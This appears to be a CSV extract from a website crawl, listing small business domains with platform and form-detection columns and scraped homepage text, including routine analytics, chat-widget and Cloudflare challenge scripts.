oxMzb5XPS6IdHbdef1yVRBExfmy0S9Q7FrZXmUdjd_iUK52hRe1fRCbqHCHf2TQmcfKMt67gqcuRFWF928K36F2HGppPxvRiOSbb53MpfTOrg9tXIVhYNtehDt9B.ReEU0xxK6TrQqQ4Os1hRyX_5xem1J6zJfqz7f7lRFWnqDgLi6dAYlNn7irCOi97Ad56RDycimwIRZ3gVWCQXsXiAJaGEgU6zyuVIsrqvRb8hvQ1BEtS.aXrzl1UgObS07tsipKLeSg4cI.E1sMw',mdrd: '3IVunt4rLLNbv3QZgt2V_dhwAmdbMYUoAVOr4MyRz80-1787940240-1.2.1.1-mHP_0jZM3dKDP1FtYmROEiZbGQ3M2fJqCl_GTlJkchh6K8wBQwQImifCGk9v.wAZcVVfYdARCRnt.NGhoijkJek4NcMjAx5YuYzgM2U8SXvAf50hkXBbDQhrC7REKatWIu.tZ5_BiVaER5S.Zw23KlBckPPwP65JCW3H2vN24NB4_OOeCtkyfy2tCR79ghnmFG8fpgwTEHHOMGJx5eGNxs5LGIcS3KjiIUFgu.akUbXhnDGvdmiiW6h6NQ6bXiRwERO7AnmzOOX0MOYZjlFc6kMTeJru_SiLzHFfcyoB1BaocNaKVOt_xA1Tfv1tQW_SvGh4YagsweOFPJVY559YlrJrgZNhZ.rZZ4TdMTWpBOLNxvPDeTltsnzp8QfNEG5fKq8WyB3fA__fnEHzeqCLpY0R4wLHyZBE1Vo_3rACScjWi5WyUK47tbrXRoTqRl7HdDO4UdXViealNBOBZkJb2g',};var a = document.createElement('script');a.nonce = '9dlnx005U0ITUSXFDvLSR9';a.src = '/cdn-cgi/challenge-platform/h/b/orchestrate/chl_page/v1?ray=a3253c661a475179';window._cf_chl_opt.cOgUHash = location.hash === '' && location.href.indexOf('#') !== -1 ? '#' : location.hash;window._cf_chl_opt.cOgUQuery = location.search === '' && location.href.slice(0, location.href.length - window._cf_chl_opt.cOgUHash.length).indexOf('?') !== -1 ? '?' : location.search;if (window.history && window.history.replaceState) {var ogU = location.pathname + window._cf_chl_opt.cOgUQuery + window._cf_chl_opt.cOgUHash;history.replaceState(null, null,""/?__cf_chl_rt_tk=UEZXCL_3ak5EWDX7qt30i7ab2NtzwKy5rET7IZkSyZ0-1787940240-1.0.1.1-DMurcA39Nn1AqXWnIuJTf2.yAbL5FHcPXhzHxTtiPKs""+ window._cf_chl_opt.cOgUHash);a.onload = function() {history.replaceState(null, null, ogU);}}document.getElementsByTagName('head')[0].appendChild(a);}());"
919,sandyrosesportcollections.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
923,altheaagewell.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
934,egmdistro.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
941,sitcomsa.com,woocommerce,woocommerce,True,0,0,0,,True,True,Nombre completo,none,True,generic,none,False,0,False,False,"Ir al contenido +505 85522913 soporte@sitcomsa.com Search $ 0.00 0 Cart Categorias de producto Mikrotik Ubiquiti Cambium Networks TP-Link X Sobre nosotros Servicios Soporte técnico Obra civil Fibra optica Planta interna Planta externa Inicio Tienda Socios Estrategicos 4net Networking Ligowave Netpoint Contactanos X $ 0.00 0 Cart En sitcomsa, nos destacamos por ofrecer soluciones a medida para superar los desafíos más exigentes en el ámbito de las telecomunicaciones. Planta Externa Nos especializamos en el diseño e implementación de redes de telecomunicaciones en áreas exteriores. Desde despliegue de fibra óptica hasta construcción de torres de comunicación, garantizamos una conectividad robusta. Planta Interna Nos especializamos en el diseño e implementación de redes de telecomunicaciones en áreas exteriores. Desde despliegue de fibra óptica hasta construcción de torres de comunicación, garantizamos una conectividad robusta. Servicios Integrales Ofrecemos soluciones especializadas para la infraestructura de telecomunicaciones interna. Desde cableado estructurado y redes WiFi hasta la instalación de equipos, aseguramos conectividad eficiente y confiable. Fibra Óptica Nos especializamos en el diseño e implementación de redes de telecomunicaciones. Desde despliegue de fibra óptica hasta construcción de torres de comunicación, garantizamos una conectividad robusta. Obra Civil Nos dedicamos a la construcción de infraestructuras para obra civil. Desde proyectos de carreteras hasta la construcción de torres, garantizando solidez y durabilidad en cada uno de nuestros proyectos. Soporte Técnico Brindamos servicios de soporte técnico especializado para mantener la funcionalidad y eficiencia de los equipos. Desde mantenimiento preventivo hasta resolución de problemas, garantizamos un rendimiento continuo. ¡Bienvenido al mundo de la tecnología que transforma vidas! Estás enfrentando problemas de conectividad, frustrado por una red que no puede seguir tu ritmo. Entonces, descubres nuestros productos. Desde los potentes routers hasta las soluciones de red confiables, cada producto lleva consigo el respaldo de marcas líderes como MikroTik, Cambium Networks, Tenda, Vertiv, Cablix y Ubiquiti. Es más que solo tecnología: es confianza. Con cada equipo que elijas, estarás potenciando tu red hacia un rendimiento excepcional. Explorar catálogo ahora ¿Estás listo para dar el siguiente paso hacia una experiencia de red sin igual? Unete a nosotros y descubre cómo nuestra tecnología puede llevar tus conexiones al siguiente nivel. Tu red, tu poder, nuestra pasión por la excelencia. ¡Su éxito es nuestros compromiso! ¡Llamanos ahora! Dirección Kilometro 13.5 carretera sur Managua Email soporte@sitcomsa.com Movil + 505 85522913 Nombre completo Correo electrónico Numero de teléfono Tipo de servicio Cotización Información Adicional Soporte Técnico Tipo de servicio Descripcion del mensaje Enviar mensaje contactanos Kilometro 13.5 carretera sur Managua +505 85522913 soporte@sitcomsa.com Socios estrategicos 4Net Networking Netpoint LigoWave Servicios Soporte Tecnico Fibra Óptica Obra Civil Planta Externa Planta Interna Ayuda Contactanos Sobre nosotros Terminos Facebook-f Instagram Linkedin-in Youtube ©2024 SITCOMSA TODOS LOS DERECHOS RESERVADOS. window.$zoho=window.$zoho || {};$zoho.salesiq=$zoho.salesiq||{ready:function(){}};var d=document;s=d.createElement(""script"");s.type=""text/javascript"";s.id=""zsiqscript"";s.defer=true;s.src=""https://salesiq.zohopublic.com/widget?plugin_source=wordpress&wc=siqa330642e821fa439cd9d832531c8159a133ff2da831ede4ed51a4d46be34077d"";t=d.getElementsByTagName(""script"")[0];t.parentNode.insertBefore(s,t); {""prefetch"":[{""source"":""document"",""where"":{""and"":[{""href_matches"":""\/*""},{""not"":{""href_matches"":[""\/wp-*.php"",""\/wp-admin\/*"",""\/wp-content\/uploads\/*"",""\/wp-content\/*"",""\/wp-content\/plugins\/*"",""\/wp-content\/themes\/astra\/*"",""\/*\\?(.+)""]}},{""not"":{""selector_matches"":""a[rel~=\""nofollow\""]""}},{""not"":{""selector_matches"":"".no-prefetch, .no-prefetch a""}}]},""eagerness"":""conservative""}]} Scroll al inicio Search Search Categorias de producto Mikrotik Ubiquiti Cambium Networks TP-Link Hamburger Toggle Menu Sobre nosotros Servicios Soporte técnico Obra civil Fibra optica Planta interna Planta externa Inicio Tienda Socios Estrategicos 4net Networking Ligowave Netpoint Contactanos Hamburger Toggle Menu Facebook Whatsapp Youtube sitcomsa 2024, Todos los derechos reservados const lazyloadRunObserver = () => { const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` ); const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => { entries.forEach( ( entry ) => { if ( entry.isIntersecting ) { let lazyloadBackground = entry.target; if( lazyloadBackground ) { lazyloadBackground.classList.add( 'e-lazyloaded' ); } lazyloadBackgroundObserver.unobserve( entry.target ); } }); }, { rootMargin: '200px 0px 200px 0px' } ); lazyloadBackgrounds.forEach( ( lazyloadBackground ) => { lazyloadBackgroundObserver.observe( lazyloadBackground ); } ); }; const events = [ 'DOMContentLoaded', 'elementor/lazyload/observe', ]; events.forEach( ( event ) => { document.addEventListener( event, lazyloadRunObserver ); } ); (function () { var c = document.body.className; c = c.replace(/woocommerce-no-js/, 'woocommerce-js'); document.body.className = c; })(); var localize = {""ajaxurl"":""http:\/\/sitcomsa.com\/wp-admin\/admin-ajax.php"",""nonce"":""bcfd646c70"",""i18n"":{""added"":""Added "",""compare"":""Compare"",""loading"":""Loading...""},""eael_translate_text"":{""required_text"":""is a required field"",""invalid_text"":""Invalid"",""billing_text"":""Billing"",""shipping_text"":""Shipping"",""fg_mfp_counter_text"":""of""},""page_permalink"":""http:\/\/sitcomsa.com\/"",""cart_redirectition"":""no"",""cart_page_url"":""http:\/\/sitcomsa.com\/carrito\/"",""el_breakpoints"":{""mobile"":{""label"":""M\u00f3vil en Retrato"",""value"":767,""default_value"":767,""direction"":""max"",""is_enabled"":true},""mobile_extra"":{""label"":""M\u00f3vil horizontal"",""value"":880,"
957,ecartglobalstore.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,403 Forbidden Access to this resource on the server is denied!
960,newageceiling.in,woocommerce,woocommerce,True,1,0,7,,True,False,,none,True,generic,none,False,2,True,False,"Survey #12, PH #4, Nagpur info@newageceiling.com India America Japan Canada China Email Us info@newageceiling.com Call Us +91-9958133279 Get a Quote Home About Us Services Pre-Consulting In-house Team In-house Consultation Install & Maintenance High Quality Products Recyclable Material Products Baffle Ceiling Lineal Ceilings Metal Tiles Multi Panel Ceilings Open Cell Ceilings Projects News FAQ Contact Us Office Address Survey #12, PH #4, Mauza Gohni (Khurd), Nagpur info@newageceiling.com +91-9958133279 Pinterest Social List Style Meets Functionality with Modern False Ceilings False ceilings offer a smart combination of beauty and practicality — making them a popular choice for living rooms, bedrooms, lobbies, offices, showrooms, and more. Our Company Contact Us A false ceiling is more than just decoration it's a smart, stylish solution that transforms interiors while solving practical problems. Button About Our Company We are a dynamic team of creatives development Style, Functionality & Innovation from Above Founded in 1987, NewAGE Ceiling Private Limited is a pioneering name in the modular commercial ceiling industry. We are one of the few Indian companies in the market with in-depth expertise as a manufacturer, supplier, and installer, offering a seamless and comprehensive ceiling solution under one roof. Driven by a passion for innovation and continuous backward integration, NewAGE has consistently set new benchmarks in quality, efficiency, and design. Complete In-House Expertise catalysts for chang the Seamlessly business applications through procedures whereas processes Get a Quote Services We Offer We Provide Best Service For Your Business All Projects In-house Team Seamlessly visualize quality intellectual capital without superior collaboration and idea sharing listically Read More High Quality Products Seamlessly visualize quality intellectual capital without superior collaboration and idea sharing listically Read More Install & Maintenance Seamlessly visualize quality intellectual capital without superior collaboration and idea sharing listically Read More Pre-Consulting Seamlessly visualize quality intellectual capital without superior collaboration and idea sharing listically Read More Recyclable Material Seamlessly visualize quality intellectual capital without superior collaboration and idea sharing listically Read More In-house Consultation Seamlessly visualize quality intellectual capital without superior collaboration and idea sharing listically Read More Our Latest Projects Let's Have a Look All Our Latest Projects. All Projects Business Planning Business Planning Business Planning Business Planning Business Planning Business Planning Why You Choose NewAge Ceiling Service ? Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. We are Committed to Quality Seamlessly visualize quality intellectual capital without superior collaboration and idea sharing listically We Care About Your Business Seamlessly visualize quality intellectual capital without superior collaboration and idea sharing listically We Care About Your Business Seamlessly visualize quality intellectual capital without superior collaboration and idea sharing listically FAQ's Common Frequently Asked Questions Lorem ipsum dolor sit amet, consectetur adipisicing elit. Amet explicabo porro nam, nobis rerum. What does NewAge Ceiling Consulting do? Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniamLorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam How much cost for consulting service? Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniamLorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam How does the Consulting process work? Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniamLorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam Request a Call Back Lorem ipsum dolor sit amet, consectetur adipisicing elit. Visa For Australia Canada United Kingdom USA Singapore Netherlands See Some Facts We Provide Best Service For Your Business 1450 Projects Succeed 1864 Peoples Likes 300 Awards Achieved 100+ Team Members News And Updates Let's Checkout our All Current News All News By uejxzw | July 17, 2025 Hello world! Welcome to WordPress. This is your first post. Edit or delete... Read more By uejxzw | December 24, 2019 Tech Entrepreneur Credits Paper For Success Lorem ipsum dolor sit amet, consectetur adipisicing elit. Voluptatem rerum voluptas... Read more By uejxzw | December 24, 2019 Nanotech Immersion Along The Highway Lorem ipsum dolor sit amet, consectetur adipisicing elit. Voluptatem rerum voluptas... Read more Testimonials What People and Clients Think About Us? Lorem ipsum dolor sit amet, consectetur adipisicing elit oluptatibus blanditiis amet optio fugiat nisi est repellendus iusto quis harum laboriosam nostrum unde distinctio Aurther Maxwell Tab Designation Lorem ipsum dolor sit amet, consectetur adipisicing elit oluptatibus blanditiis amet optio fugiat nisi est repellendus iusto quis harum laboriosam nostrum unde distinctio Aurther Maxwell CEO, Apple Inc. Lorem ipsum dolor sit amet, consectetur adipisicing elit oluptatibus blanditiis amet optio fugiat nisi est repellendus iusto quis harum laboriosam nostrum unde distinctio Aurther Maxwell CEO, Apple Inc. Lorem ipsum dolor "
962,verduijnbros.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,403 | Access blocked
965,sortedservice.in,woocommerce,woocommerce,True,4,0,0,₹,True,False,Leave this field empty if you're human:,mailchimp,False,,none,False,0,False,False,"All Departments Computers & Accessories Pendrives Hard Disks Mouse Keyboards Pads Speakers Network Related Networking Services CCTV Camera CCTV Maintenance Services IT Software Digital Marketing Company Web Design Service SEO Service SMO Service Logo Design Company Taxation and Accounting Taxation Related GST Related PTAX Book Appointment With CA Legal Services Criminal Matters Civil Matters Consumer Court Related Car Rental Services Car Rent 7 seater cars for rent 9 seater cars for rent Traveller on rent Winger on rent Bus rental services Catering Services Catering Service Home Shop About Us Blog Contact Order Tracking GSTIN No.: 19BOVPP9711B2ZF Copyright 2024 © Sortedservice. All rights reserved. Growing with Rahul Baitha My account Featured Products Wishlist Network Issues Hardware Issues Order Tracking GSTIN No.: 19BOVPP9711B2ZF All CCTV Camera Computers & Accessories Search Sign In Account Wishlist - 0 Total ₹ 0.00 No products in the cart. Free Shipping on All Orders Over ₹999 All Departments Computers & Accessories Pendrives Hard Disks Mouse Keyboards Pads Speakers Network Related Networking Services CCTV Camera CCTV Maintenance Services IT Software Digital Marketing Company Web Design Service SEO Service SMO Service Logo Design Company Taxation and Accounting Taxation Related GST Related PTAX Book Appointment With CA Legal Services Criminal Matters Civil Matters Consumer Court Related Car Rental Services Car Rent 7 seater cars for rent 9 seater cars for rent Traveller on rent Winger on rent Bus rental services Catering Services Catering Service Home Shop About Us Blog Contact Only this weekend Super Discount Items on sale this week Top picks this week. Up to 50% off the best selling products. Order Tracking GSTIN No.: 19BOVPP9711B2ZF 0 Total ₹ 0.00 No products in the cart. Free Shipping on All Orders Over ₹999 Weekend Discount Laptop Accessories Discover Last call for up to 20% off! Shop Today! Schedule Now! Accounting Expert Maximize Your Potential Learn More Weekend Discount Rent a Car Today! Explore Opt. Get 10% Off Your First Rental! Book Now /*! elementor - v3.18.0 - 20-12-2023 */ .elementor-widget-divider{--divider-border-style:none;--divider-border-width:1px;--divider-color:#0c0d0e;--divider-icon-size:20px;--divider-element-spacing:10px;--divider-pattern-height:24px;--divider-pattern-size:20px;--divider-pattern-url:none;--divider-pattern-repeat:repeat-x}.elementor-widget-divider .elementor-divider{display:flex}.elementor-widget-divider .elementor-divider__text{font-size:15px;line-height:1;max-width:95%}.elementor-widget-divider .elementor-divider__element{margin:0 var(--divider-element-spacing);flex-shrink:0}.elementor-widget-divider .elementor-icon{font-size:var(--divider-icon-size)}.elementor-widget-divider .elementor-divider-separator{display:flex;margin:0;direction:ltr}.elementor-widget-divider--view-line_icon .elementor-divider-separator,.elementor-widget-divider--view-line_text .elementor-divider-separator{align-items:center}.elementor-widget-divider--view-line_icon .elementor-divider-separator:after,.elementor-widget-divider--view-line_icon .elementor-divider-separator:before,.elementor-widget-divider--view-line_text .elementor-divider-separator:after,.elementor-widget-divider--view-line_text .elementor-divider-separator:before{display:block;content:"""";border-bottom:0;flex-grow:1;border-top:var(--divider-border-width) var(--divider-border-style) var(--divider-color)}.elementor-widget-divider--element-align-left .elementor-divider .elementor-divider-separator>.elementor-divider__svg:first-of-type{flex-grow:0;flex-shrink:100}.elementor-widget-divider--element-align-left .elementor-divider-separator:before{content:none}.elementor-widget-divider--element-align-left .elementor-divider__element{margin-left:0}.elementor-widget-divider--element-align-right .elementor-divider .elementor-divider-separator>.elementor-divider__svg:last-of-type{flex-grow:0;flex-shrink:100}.elementor-widget-divider--element-align-right .elementor-divider-separator:after{content:none}.elementor-widget-divider--element-align-right .elementor-divider__element{margin-right:0}.elementor-widget-divider:not(.elementor-widget-divider--view-line_text):not(.elementor-widget-divider--view-line_icon) .elementor-divider-separator{border-top:var(--divider-border-width) var(--divider-border-style) var(--divider-color)}.elementor-widget-divider--separator-type-pattern{--divider-border-style:none}.elementor-widget-divider--separator-type-pattern.elementor-widget-divider--view-line .elementor-divider-separator,.elementor-widget-divider--separator-type-pattern:not(.elementor-widget-divider--view-line) .elementor-divider-separator:after,.elementor-widget-divider--separator-type-pattern:not(.elementor-widget-divider--view-line) .elementor-divider-separator:before,.elementor-widget-divider--separator-type-pattern:not([class*=elementor-widget-divider--view]) .elementor-divider-separator{width:100%;min-height:var(--divider-pattern-height);-webkit-mask-size:var(--divider-pattern-size) 100%;mask-size:var(--divider-pattern-size) 100%;-webkit-mask-repeat:var(--divider-pattern-repeat);mask-repeat:var(--divider-pattern-repeat);background-color:var(--divider-color);-webkit-mask-image:var(--divider-pattern-url);mask-image:var(--divider-pattern-url)}.elementor-widget-divider--no-spacing{--divider-pattern-size:auto}.elementor-widget-divider--bg-round{--divider-pattern-repeat:round}.rtl .elementor-widget-divider .elementor-divider__text{direction:rtl}.e-con-inner>.elementor-widget-divider,.e-con>.elementor-widget-divider{width:var(--container-widget-width,100%);--flex-grow:var(--container-widget-flex-grow)} Nationwide Shipment Your deliveries are handled smoothly nationwide. Extended 45 day returns You have the right to return your orders within 45 days. Secure Payment Your payments are secure with our private security network. Super Discount Wifi Router Don't miss grab it today Shop Now Deals of the week! Trending Products Network"
967,danrelax.com,woocommerce,woocommerce,True,0,0,0,EUR,False,False,,klaviyo,False,,none,False,0,False,False,"Saltar al contenido COLCHONES ALMOHADAS BASES CABECEROS COMPLEMENTOS PACKS AHORRO Carrito 0 Carrito 0 Menú de navegación Menú de navegación COLCHONES ALMOHADAS BASES CABECEROS COMPLEMENTOS PACKS AHORRO Tu colchón se deforma con el tiempo DanRelax te da 10 años de garantía real Ver colchones Nuestros colchones Colchón Gold Colchón Sport Colchón Nature Colchón Original Colchón One Colchón hybrid Categorías Colchones COMPRAR Packs Ahorro COMPRAR Almohadas COMPRAR Bases COMPRAR El descanso que mereces, diseñado para ti En DanRelax creemos que un buen descanso transforma tu día a día. Por eso, diseñamos colchones que se adaptan a ti, combinando materiales de alta calidad y tecnología avanzada para ofrecerte el equilibrio perfecto entre confort y soporte. Nuestro objetivo es que cada noche sea una experiencia de descanso profundo y reparador, asegurándote bienestar y energía para cada jornada. Con 101 noches de prueba y 10 años de garantía, puedes confiar en que tu colchón ha sido creado pensando en tu comodidad y salud. DESCUBRE MÁS Descansa con DanRelax 101 noches de prueba Prueba tu nuevo colchón durante 101 noches. Si no estás satisfecho, te lo cambiamos o te devolvemos el dinero. Fabricado en España Nuestra calidad está avalada por la tradición artesanal española y la tecnología de vanguardia. Certificaciones ecológicas Material reciclados y procesos respetuosos con el medio ambiente. 10 años de garantía Confía en la calidad y durabilidad de nuestros colchones. Historias de sueños perfectos Ana, 35 años ⭐⭐⭐⭐⭐ “Por fin duermo como un bebé. Recomiendo DanRelax a todos.” Luis, 42 años ⭐⭐⭐⭐⭐ “El colchón perfecto para mi espalda. No puedo vivir sin él.” Sara, 28 años ⭐⭐⭐⭐⭐ “El mejor colchón que he tenido en mi vida. Gracias, DanRelax.” Personalización y Tecnología Tecnología de vanguardia Cada capa de nuestros colchones está diseñada para brindar la comodidad y el soporte que necesitas. Personalizado a tu medida Cada colchón DanRelax se adapta a tus necesidades, desde la firmeza hasta la altura. ¿Tienes dudas? Hablemos Asesoramiento personalizado Nuestro equipo de expertos te ayudará a encontrar el colchón perfecto para tus necesidades. Habla con nosotros Contáctanos a través de nuestro chat o por teléfono. Estamos aquí para ayudarte. Contacto Aviso legal Términos y condiciones Quiénes somos Blog Preguntas frecuentes Como abrir tu colchón y como cuidarlo Contacto Aviso legal Términos y condiciones Quiénes somos Blog Preguntas frecuentes Como abrir tu colchón y como cuidarlo {""prefetch"":[{""source"":""document"",""where"":{""and"":[{""href_matches"":""\/*""},{""not"":{""href_matches"":[""\/wp-*.php"",""\/wp-admin\/*"",""\/wp-content\/uploads\/*"",""\/wp-content\/*"",""\/wp-content\/plugins\/*"",""\/wp-content\/themes\/neve-child-master\/*"",""\/wp-content\/themes\/neve\/*"",""\/*\\?(.+)""]}},{""not"":{""selector_matches"":""a[rel~=\""nofollow\""]""}},{""not"":{""selector_matches"":"".no-prefetch, .no-prefetch a""}}]},""eagerness"":""conservative""}]} var node = document.getElementsByClassName('woocommerce-message')[0]; if(node && document.getElementById('pys_late_event')) { var messageText = node.textContent.trim(); if(!messageText) { node.style.display = 'none'; } } WhatsApp Hola👋 ¿Te puedo ayudar? Pregúntame lo que necesites. Abrir chat const dfLayerOptions = { installationId: 'a7d81ae0-f7e5-429b-88b2-e6a52015bbb1', zone: 'eu1' }; (function (l, a, y, e, r, s) { r = l.createElement(a); r.onload = e; r.async = 1; r.src = y; s = l.getElementsByTagName(a)[0]; s.parentNode.insertBefore(r, s); })(document, 'script', 'https://cdn.doofinder.com/livelayer/1/js/loader.min.js', function () { doofinderLoader.load(dfLayerOptions); }); (function () { var c = document.body.className; c = c.replace(/woocommerce-no-js/, 'woocommerce-js'); document.body.className = c; })(); .wp-container-core-buttons-is-layout-16018d1d{justify-content:center;}.wp-container-core-group-is-layout-28e233cd > .alignfull{margin-right:calc(30px * -1);margin-left:calc(30px * -1);}.wp-elements-999c013eacfa8d245e79794edf06cf9a a:where(:not(.wp-element-button)){color:var(--wp--preset--color--neve-text-color);}.wp-elements-a42d2b95007aaecf1f8c770357054005 a:where(:not(.wp-element-button)){color:var(--wp--preset--color--neve-text-color);}.wp-container-core-group-is-layout-92954f26 > .alignfull{margin-right:calc(10px * -1);margin-left:calc(10px * -1);}.wp-elements-f36845cbb57dd9b14305cc8ff1bf5322 a:where(:not(.wp-element-button)){color:var(--wp--preset--color--neve-text-color);}.wp-elements-2d0e1771ea5376d975cb9c331208711e a:where(:not(.wp-element-button)){color:var(--wp--preset--color--neve-text-color);}.wp-elements-ed2d8b97873241d6a0210463bc26c2c1 a:where(:not(.wp-element-button)){color:var(--wp--preset--color--neve-text-color);}.wp-container-core-columns-is-layout-9d6595d7{flex-wrap:nowrap;}.wp-elements-fe02c47869f958c0f6038ae04f2bcc12 a:where(:not(.wp-element-button)){color:var(--wp--preset--color--neve-text-color);}.wp-elements-ff88eb06ac3eeac8a66cf5eea46ef196 a:where(:not(.wp-element-button)){color:var(--wp--preset--color--neve-text-color);}.wp-elements-01a9c94fdb613ed329c8e32fad03fd1f a:where(:not(.wp-element-button)){color:var(--wp--preset--color--neve-text-color);}.wp-elements-06cc2e21328ed0db8d93ce7193de4b86 a:where(:not(.wp-element-button)){color:var(--wp--preset--color--neve-text-color);}.wp-elements-4a4137a5316cf9be538b0f317bc4b26d a:where(:not(.wp-element-button)){color:var(--wp--preset--color--neve-text-color);}.wp-elements-9a5d56778759071ea38ab9e6d8e97f8d a:where(:not(.wp-element-button)){color:var(--wp--preset--color--neve-text-color);} var woocommerce_params = {""ajax_url"":""\/wp-admin\/admin-ajax.php"",""wc_ajax_url"":""\/?wc-ajax=%%endpoint%%"",""i18n_password_show"":""Mostrar contrase\u00f1a"",""i18n_password_hide"":""Ocultar contrase\u00f1a""}; wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } ); ( function( domain, translations ) { var localeData = translations.locale_data[ domain ] || translations.locale_data.messages; localeData[""""].domain = domain; wp.i18n.setLocal"
97,orderatyapp.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Welcome to nginx! If you see this page, the nginx web server is successfully installed and working. Further configuration is required. For online documentation and support please refer to nginx.org . Commercial support is available at nginx.com . Thank you for using nginx."
972,idclinic.lt,woocommerce,woocommerce,True,0,0,0,EUR,True,False,El. paštas,none,False,,tidio,False,0,True,False,"!function(c,h,i,m,p){m=c.createElement(h),p=c.getElementsByTagName(h)[0],m.async=1,m.src=i,p.parentNode.insertBefore(m,p)}(document,""script"",""https://chimpstatic.com/mcjs-connected/js/users/8e5c6a96c6831cc0bfa7ae358/07461664a94f35fc9a81de762.js""); (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src= 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','GTM-NFGFMF6'); (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src= 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','GTM-TMJDJH3B'); (function(c, l, a, r, i, t, y) { c[a] = c[a] || function() { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = ""https://www.clarity.ms/tag/"" + i + ""?ref=wordpress""; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, ""clarity"", ""script"", ""sjbjxfyl61""); html, body { overflow-x: hidden; } .elementor-widget-woocommerce-checkout-page .woocommerce-checkout #payment .payment_methods .payment_box { background-color: transparent; } #content > div.page-content > div > p { color: #ffffff !important; } .woocommerce-product-gallery{ opacity: 1 !important; } /* Advertising phone number */ .id_phone{ display: none; } .id_phone_0 { display: inline-block; } #wpadminbar #wp-admin-bar-amelia-menu > .ab-item svg { color: #a7aaad; } #wpadminbar #wp-admin-bar-amelia-menu:hover > .ab-item svg { color: #72aee6; } #wpadminbar #wp-admin-bar-amelia-menu > .ab-item .ab-icon img { width: 20px; height: 20px; padding: 0; object-fit: contain; } .e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload), .e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * { background-image: none !important; } @media screen and (max-height: 1024px) { .e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload), .e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * { background-image: none !important; } } @media screen and (max-height: 640px) { .e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload), .e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * { background-image: none !important; } } .elementor-widget-woocommerce-checkout-page { color: #FFF !important; } .elementor-widget-woocommerce-checkout-page .woocommerce .shop_table tfoot td, .elementor-widget-woocommerce-checkout-page .woocommerce .shop_table tfoot th { color: #FFF !important; } .elementor-widget-woocommerce-checkout-page .woocommerce .shop_table tbody td { color: #FFF !important; } Eiti prie turinio Search I-V 9-18 val. +370 686 11311 I-V 9-18 val. +370 603 04104 Paslaugos Close Paslaugos Open Paslaugos Šeimos medicina Dermatologija Dietologija sugausiems ir vaikams Endokrinologija Funkcinė medicina Gastroenterologija Ginekologija Intraveninės terapijos Kūno puoselėjimo procedūros Longevity Tyrimai ir testai Šeimos gydytojo konsultacija ir tyrimai Gyvensenos medicinos specialisto konsultacija Apgamų patikra Biorevitalizacija Botulino injekcijos Hialiurono injekcijos Injekcijos nuo prakaitavimo Mezoterapija Plaukų slinkimo gydymas Antsvoris ir nutukimas Kūno sudėties analizė Medžiagų apykaitos tyrimas (PNOE) Mitybos nepakankamumas Onkologinės ligos Policistinių kiaušidžių sindromas Sportuojančių ir sportininkų mityba Vaikų dietologija Endokrinologo konsultacija Policistinių kiaušidžių sindromas Skydliaukės echoskopija Hormonų tyrimai Funkcinė medicina Helicobacter Pylori ureazės kvėpavimo testas (UBT) Gastroenterologo konsultacija GI-MAP – Išsamus žarnyno mikrobiomos tyrimas Virškinamojo trakto ligos Vidaus organų echoskopija Ginekologo konsultacija Hormonų tyrimai Gimdos kaklelio citologinis tyrimas (PAP) Ginekologinė echoskopija Policistinių kiaušidžių sindromas 3D ir 4D vaisiaus ultragarsinis tyrimas NAD+ intraveninė terapija Sveikatinimui Sportuojantiems Gydymui Kriolipolizė Kūno kontūravimas NAD+ intraveninė terapija Genetinis ir epigenetinis tyrimas Longevity programa Medžiagų apykaitos tyrimas (PNOE) Dutch Complete hormonų tyrimas Genetiniai ir epigenetiniai tyrimai Kūno sudėties analizės tyrimas Bioimpedansu Kraujo tyrimų programos Medžiagų apykaitos tyrimas - PNOE Ultragarsiniai tyrimai echoskopu 3D ir 4D vaisiaus ultragarsinis tyrimas GI-MAP – Išsamus žarnyno mikrobiomos tyrimas Šeimos medicina Šeimos gydytojo konsultacija ir tyrimai Gyvensenos medicinos specialisto 